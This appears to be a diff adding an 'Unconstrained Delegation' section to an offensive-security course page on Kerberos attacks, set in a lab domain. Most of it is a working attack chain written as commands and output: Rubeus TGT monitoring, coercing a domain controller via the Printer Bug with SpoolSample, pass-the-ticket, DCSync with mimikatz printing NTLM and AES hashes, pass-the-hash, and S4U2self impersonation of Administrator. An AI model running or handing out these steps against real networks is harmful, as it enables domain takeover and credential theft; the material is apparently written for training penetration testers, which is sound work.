@@ -662,3 +662,441 @@ This option is quite dangerous.
 
 ![kerberos attacks 7](../../../images/kerberos_attacks7.png)
 
+## Unconstrained Delegation
+
+### Computers
+
+Unconstrained delegation was the only type of delegation available in Windows 2000. If a user requests a service ticket on a server with unconstrained delegation enabled, the user's TGT is embedded into the service ticket that is then presented to the server.
+
+The server can cache this ticket in memory and then pretend to be that user for subsequent resource requests in the domain. If unconstrained delegation is not enabled, only the user's TGS ticket will be stored in memory. In this case, if the machine is compromised, an attacker could only access the resource specified in the TGS ticket in that user's context.
+
+#### Waiting for Privileged User Authentication
+
+If you are able to compromise a server that has unconstrained delegation enabled, and a Domain Administrator logs in, you will be able to extract their TGT and use it to move laterally and compromise other machines, including the DCs.
+
+Rubeus is the go-to tool for this attack. As a local administrator, Rubeus can be run to monitor stored tickets. If a TGT is found within a TGS ticket, Rubeus will display it to you.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 5 seconds for new TGTs
+```
+
+A few moments later, `Sarah Lafferty` connects to the compromised server. Rubeus retrieves Sarah's copy of the TGT that was embedded in her TGS ticket and displays it to you encoded in base64.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 5 seconds for new TGTs
+
+[*] 8/14/2020 11:06:40 AM UTC - Found new TGT:
+
+  User                  :  sarah.lafferty@INLANEFREIGHT.LOCAL
+  StartTime             :  8/14/2020 4:06:37 AM
+  EndTime               :  8/14/2020 2:06:37 PM
+  RenewTill             :  8/21/2020 4:06:37 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  Base64EncodedTicket   :
+
+    doIFmTCCBZWgAwIBBaEDAgEWooIEgjCCBH5hggR6MIIEdqADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQsMIIEKKADAgESoQMCAQKiggQaBIIEFr7cTE+mYOQsYF69H0dnaQwX2Iy/dB0k91uEBGQh/Dk0lm12PzkVgX<SNIP>
+```
+
+Thanks to PowerView, you can list the groups to which Sarah belongs. She happens to be in the Domain Admins group. So you have the TGT of a Domain Admin now.
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainGroup -MemberIdentity sarah.lafferty
+
+grouptype              : DOMAIN_LOCAL_SCOPE, SECURITY
+iscriticalsystemobject : True
+samaccounttype         : ALIAS_OBJECT
+samaccountname         : Denied RODC Password Replication Group
+whenchanged            : 7/26/2020 8:14:37 PM
+<SNIP>
+
+grouptype              : GLOBAL_SCOPE, SECURITY
+admincount             : 1
+iscriticalsystemobject : True
+samaccounttype         : GROUP_OBJECT
+samaccountname         : Domain Admins
+whenchanged            : 8/14/2020 11:04:50 AM
+<SNIP>
+
+usncreated             : 12348
+grouptype              : GLOBAL_SCOPE, SECURITY
+samaccounttype         : GROUP_OBJECT
+samaccountname         : Domain Users
+whenchanged            : 7/26/2020 8:14:37 PM
+<SNIP>
+```
+
+So you will use this TGT to access the Domain Controller's CIFS service, for example. The `/ptt` option/flag is used to pass the received ticket into memory so that it can be used for future requests.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe asktgs /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /service:cifs/dc01.INLANEFREIGHT.local /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Ask TGS
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (10.129.1.207)
+[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
+[*] Building TGS-REQ request for: 'cifs/dc01.INLANEFREIGHT.local'
+[+] TGS request successful!
+[+] Ticket successfully imported!
+[*] base64(ticket.kirbi):
+
+      doIFyDCCBcSgAwIBBaEDAgEWooIErTCCBKlhggSlMIIEoaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKzApoAMCAQKhIjAgGwRjaWZzGxhkYzAxLklOTEFORUZSRUlHSFQubG9jYWyjggRUMIIEUKADAgES
+      oQMCAQOiggRCBIIEPrCawPV<SNIP>
+
+  ServiceName           :  cifs/dc01.INLANEFREIGHT.local
+  ServiceRealm          :  INLANEFREIGHT.LOCAL
+  UserName              :  sarah.lafferty
+  UserRealm             :  INLANEFREIGHT.LOCAL
+  StartTime             :  8/14/2020 4:21:49 AM
+  EndTime               :  8/14/2020 2:06:37 PM
+  RenewTill             :  8/21/2020 4:06:37 AM
+  Flags                 :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
+  KeyType               :  aes256_cts_hmac_sha1
+  Base64(key)           :  zRzk0ldsF4rb7p7/MlfRkhOzkjIHL4DSok1vXYS3lt8=
+```
+
+In case the above command doesn't work, you can also use the `renew`  action to get a brand new TGT instead of a TGS ticket.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe renew /ticket:doIFmTCCBZWgAwIBBaE<SNIP>LkxPQ0FM /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: Renew Ticket
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
+[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\brian.willis'
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIGHDCCBhigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D<SNIP>.
+```
+
+Once you have the TGS or the TGT you can effectively list the contents of the DC file system as shown in the following command.
+
+```powershell
+PS C:\Tools> dir \\dc01.inlanefreight.local\c$
+
+ Volume in drive \\dc01.inlanefreight.local\c$ has no label.
+ Volume Serial Number is 7674-0745
+
+ Directory of \\dc01.inlanefreight.local\c$
+
+07/27/2020  05:56 PM    <DIR>          Department Shares
+07/16/2016  06:23 AM    <DIR>          PerfLogs
+07/28/2020  05:35 AM    <DIR>          Program Files
+07/27/2020  12:14 PM    <DIR>          Program Files (x86)
+07/27/2020  07:37 PM    <DIR>          Software
+07/30/2020  07:15 PM    <DIR>          Tools
+07/30/2020  11:49 AM    <DIR>          Users
+07/30/2020  09:13 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               8 Dir(s)  27,711,119,360 bytes free
+```
+
+You could also get a TGS ticket for the LDAP service and ask for synchronization with the DC to get all the user's password hashes.
+
+#### Leveraging the Printer Bug
+
+The Printer Bug is a flaw in the MS-RPRN protocol (_Print System Remote Protocol_). This protocol defines the communication of print jobs processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spools named pipe with the `RpcOpenPrinter` method and use the `RpcRemoteFindFirstPrinterChangeNotificationEx` method, and force the server to authenticate to any host provided by the client over SMB.
+
+In other words, the Printer Bug flaw can be leveraged to coerce a server to authenticate back to an arbitrary host. It can be combined with unconstrained delegation to force a DC to authenticate to a host you control. For example, if you can gain control of SQL01 in the example above, then you may coerce DC01 to authenticate back to the compromised host and retrieve the TGT for DC01. Using this TGT, you would then be able to gain full access to DC01 and perform attacks such as DCSync to compromise the domain. If the DC(s) do not have the spooler service running, you can use this against any other computer in the domain and craft silver tickets with Rubeus, using the computer's account TGT.
+
+This attack can be performed using [SpoolSample PoC](https://github.com/leechristensen/SpoolSample), which is used to coerce windows hosts to authenticate to other hosts, via the `MS-RPRN RPC` interface.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 5 seconds for new TGTs
+```
+
+With Rubeus running in monitor mode, you then attempt to trigger the Printer Bug from the same host by running the `SpoolSample` tool in another console window. The syntax for this tool is `SpoolSample.exe <target server> <capture server>`, where the target server in your example lab is DC01 and the capture server is SQL01.
+
+```powershell
+PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
+
+[+] Converted DLL to shellcode
+[+] Executing RDI
+[+] Calling exported function
+TargetServer: \\dc01.inlanefreight.local, CaptureServer: \\sql01.inlanefreight.local
+Target server attempted authentication and got an access denied. If coercing authentication to an NTLM challenge-response capture tool(e.g. responder/inveigh/MSF SMB capture), this is expected and indicates the coerced authentication worked.
+```
+
+If everything works as expected, you will get the above confirmation message from the tool. Switching back to the console running Rubeus in monitor mode, you retrieved the TGT from the DC01$ account, which is the DC machine account.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Monitoring
+[*] Monitoring every 5 seconds for new TGTs
+
+[*] 8/14/2020 11:49:26 AM UTC - Found new TGT:
+
+  User                  :  DC01$@INLANEFREIGHT.LOCAL
+  StartTime             :  8/14/2020 4:22:44 AM
+  EndTime               :  8/14/2020 2:22:44 PM
+  RenewTill             :  8/20/2020 6:52:29 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUl<SNIP>
+```
+
+You can use this ticket to get a new valid TGT in memory using the `renew` option in Rubeus.
+
+```powershell
+PS C:\Tools> .\Rubeus.exe renew /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQ
+uTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMCAQKiggPxBIID7XBw4BNnnymchVY/H/
+9966JMGtJhKaNLBt21SY3+on4lrOrHo<SNIP> /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Renew Ticket
+
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (10.129.1.207)
+[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\DC01$'
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCBFVhggRRMIIETaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
+      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggQDMIID/6ADAgESoQMC
+      AQKiggPxBIID7W7EOz2Zqm1a6b9/cCHeJbZdt0qgV8Wgw1BS2Jctk8X9l6ibkK7G+s/jyPDL6ReV0OvP
+      p3ClWOjdoLO3jH<SNIP>
+    
+[+] Ticket successfully imported!
+```
+
+Now that you have the TGT of DC01$ in memory, you can perform the DCSync attack to retrieve a target user's NTLM password hash. In this example, you retrieve secrets for the user `sarah.lafferty`.
+
+```powershell
+C:\Tools> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+  
+mimikatz # lsadump::dcsync /user:sarah.lafferty
+
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'DC01.INLANEFREIGHT.LOCAL' will be the DC server
+[DC] 'sarah.lafferty' will be the user account
+
+Object RDN           : sarah.lafferty
+
+** SAM ACCOUNT **
+
+SAM Username         : sarah.lafferty
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000200 ( NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 8/14/2020 4:06:13 AM
+Object Security ID   : S-1-5-21-2974783224-3764228556-2640795941-1122
+Object Relative ID   : 1122
+
+Credentials:
+  Hash NTLM: 0fcb586d2aec31967c8a310d1ac2bf50
+    ntlm- 0: 0fcb586d2aec31967c8a310d1ac2bf50
+    ntlm- 1: cf3a5525ee9414229e66279623ed5c58
+    lm  - 0: 2fd05b1ff89bfeed627937845f3bc535
+    lm  - 1: 3cf0c818426269923b3a993b071b81d5
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : e27b6e4d84697eb7cf50dc6d0efdb226
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : INLANEFREIGHT.LOCALsarah.lafferty
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : ba5b9b6850a1aea865ab1a7fdc895d1e27f39c327b8f7d4c96132b4438727386
+      aes128_hmac       (4096) : bee242dbe9cb898c67b8075e13384b22
+      des_cbc_md5       (4096) : 029e1c2af1237351
+    OldCredentials
+      aes256_hmac       (4096) : 13b57fa4a6c0f4adce4b1d85e64a909d35dce98736909f370154f9bd08b8bc67
+      aes128_hmac       (4096) : 1fdbc782bcdfcd692923dc54785d5ee1
+      des_cbc_md5       (4096) : ba677a73a82a2a9e
+
+* Primary:Kerberos *
+    Default Salt : INLANEFREIGHT.LOCALsarah.lafferty
+    Credentials
+      des_cbc_md5       : 029e1c2af1237351
+    OldCredentials
+      des_cbc_md5       : ba677a73a82a2a9e
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  966bec5d60500f0e964fb78be94cc0a8
+    02  1abbf4255613844082376a5288cfcfb2
+    03  c74c93a52310d2a88581ffb075aeff33
+    <SNIP>
+```
+
+You can capture any account's hash, such as the Administrator account, and then you can use Rubeus or Mimikatz to get a ticket from the compromised account. For example, take Sarah's hash and create a ticket with it:
+
+```powershell
+PS C:\Tools> .\Rubeus.exe asktgt /rc4:0fcb586d2aec31967c8a310d1ac2bf50 /user:sarah.lafferty /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 0fcb586d2aec31967c8a310d1ac2bf50
+[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.LOCAL\sarah.lafferty'
+[*] Using domain controller: 172.16.99.3:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+<SNIP>
+```
+
+Now you can use this ticket to impersonate Sarah:
+
+```powershell
+PS C:\Tools> dir \\dc01.inlanefreight.local\c$
+
+ Volume in drive \\dc01.inlanefreight.local\c$ has no label.
+ Volume Serial Number is 7674-0745
+
+ Directory of \\dc01.inlanefreight.local\c$
+
+07/27/2020  05:56 PM    <DIR>          Department Shares
+07/16/2016  06:23 AM    <DIR>          PerfLogs
+07/28/2020  05:35 AM    <DIR>          Program Files
+07/27/2020  12:14 PM    <DIR>          Program Files (x86)
+07/27/2020  07:37 PM    <DIR>          Software
+07/30/2020  07:15 PM    <DIR>          Tools
+07/30/2020  11:49 AM    <DIR>          Users
+07/30/2020  09:13 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               8 Dir(s)  27,711,119,360 bytes free
+```
+
+#### S4U2self for Non-Domain Controllers
+
+If the target computer is not a DC, or if you want to execute attacks other than DCSync, you can use S4U2self to obtain a Service Ticket on behalf of any user you want to impersonate.
+
+With a ticket captured from DC01 using Rubeus monitor and SpoolSample you can use `Rubeus s4u /self` to forge a service ticket for any servicy. Create a ticket to connect through SMB using the CIFS service. You will need to use `Rubeus s4u /self`, set the alternative service to CIFS, and use the ticket you have:
+
+```powershell
+PS C:\Tools> .\Rubeus.exe s4u /self /nowrap /impersonateuser:Administrator /altservice:CIFS/dc01.inlanefreight.local /ptt /ticket:doIFZjCCBWKgAwIBBaEDAgEWooIEWTCCB<SNIP>
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+[*] Action: S4U
+
+[*] Action: S4U
+
+[*] Building S4U2self request for: 'DC01$@INLANEFREIGHT.LOCAL'
+[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
+[*] Sending S4U2self request to 172.16.99.3:88
+[+] S4U2self success!
+[*] Substituting alternative service name 'CIFS/dc01.inlanefreight.local'
+[*] Got a TGS for 'Administrator' to 'CIFS@INLANEFREIGHT.LOCAL'
+[*] base64(ticket.kirbi):
+<SNIP>
+```
+
+This command allows you to impersonate Administrator and request a servic ticket for the CIFS service, enabling SMB connections as the impersonated user. This method is particularly useful for scenarios where you have a ticket from a computer that is not a DC.
+
+```powershell
+PS C:\Tools> ls \\dc01.inlanefreight.local\c$
+
+    Directory: \\dc01.inlanefreight.local\c$
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         4/3/2023   2:58 PM                carole.holmes
+d-----        2/25/2022  10:20 AM                PerfLogs
+d-r---        10/6/2021   3:50 PM                Program Files
+d-----        4/12/2023   3:24 PM                Program Files (x86)
+d-----        3/30/2023  11:08 AM                Shares
+d-----         4/4/2023   1:49 PM                Tools
+d-----        3/30/2023   3:13 PM                Unconstrained
+d-r---         4/4/2023  11:34 AM                Users
+d-----       10/14/2022   6:49 AM                Windows
+```
+
